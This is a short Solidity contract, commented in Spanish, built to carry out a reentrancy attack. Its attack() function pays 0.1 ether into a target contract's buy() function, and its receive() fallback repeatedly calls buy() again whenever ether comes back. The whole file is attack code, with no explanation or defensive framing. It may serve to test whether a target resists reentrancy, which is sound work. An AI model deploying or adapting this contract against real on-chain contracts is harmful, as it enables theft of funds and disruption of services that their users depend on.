// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrantContract {
    address public targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    receive() external payable {
        // ¡OJO! Aquí forzamos que siempre intente reentrar:
        (bool success, ) = targetContract.call{value: 0.1 ether}(
            abi.encodeWithSignature("buy()")
        );
        require(success, "Reentrancy attack failed");
    }

    function attack() external payable {
        require(msg.value == 0.1 ether, "Incorrect ETH amount");

        // Iniciar el ataque llamando a `buy` por primera vez
        (bool success, ) = targetContract.call{value: msg.value}(
            abi.encodeWithSignature("buy()")
        );
        require(success, "Initial call failed");
    }
}
